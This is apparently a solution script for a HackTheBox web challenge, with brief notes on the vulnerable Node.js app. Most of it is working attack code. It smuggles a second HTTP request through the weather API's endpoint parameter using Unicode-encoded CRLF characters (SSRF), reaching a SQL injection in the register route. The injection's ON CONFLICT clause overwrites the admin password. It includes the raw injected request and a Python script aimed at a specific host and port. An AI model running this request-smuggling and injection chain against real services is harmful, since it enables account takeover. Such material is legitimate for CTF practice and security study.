'''
http://www.pdsdt.lovepdsdt.com/index.php/2021/04/24/hackthebox-writeup/
https://blog.csdn.net/f_cccc/article/details/116406838

Node.js + SSRF + sql injection

Review the source code found register has a sql injection bug.
But need the IP to be 127.0.0.1.
api/weather can send endpoint parameter from local as a IP.


SQL code:
INSERT INTO users (username, password) VALUES ('${user}', '${pass}')

Injection code:
INSERT INTO users (username, password) VALUES ('admin', '123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--')

on conflict do update set

username=admin')
password=123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--

POST package:

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

username=admin')&password=123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--

URL encode:
' ' -> \u0120
'\r'-> \u010D
'\n'-> \u010A
'''
import requests

url = 'http://206.189.125.243:32056'

username = "admin"
password = "1337') ON CONFLICT(username) DO UPDATE SET password = 'admin123';--"

parsedUsername = username.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parsedUsername) + len(parsedPassword) + 19
endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-formurlencoded\u010D\u010AContent-Length:\u0120' + str(contentLength) + '\u010D\u010A\u010D\u010Ausername=' + parsedUsername + '&password=' + parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol=' 
r = requests.post(url + '/api/weather', json={ 'endpoint': endpoint, 'city': 'lol', 'country': 'lol'})
print parsedUsername,parsedPassword
print r
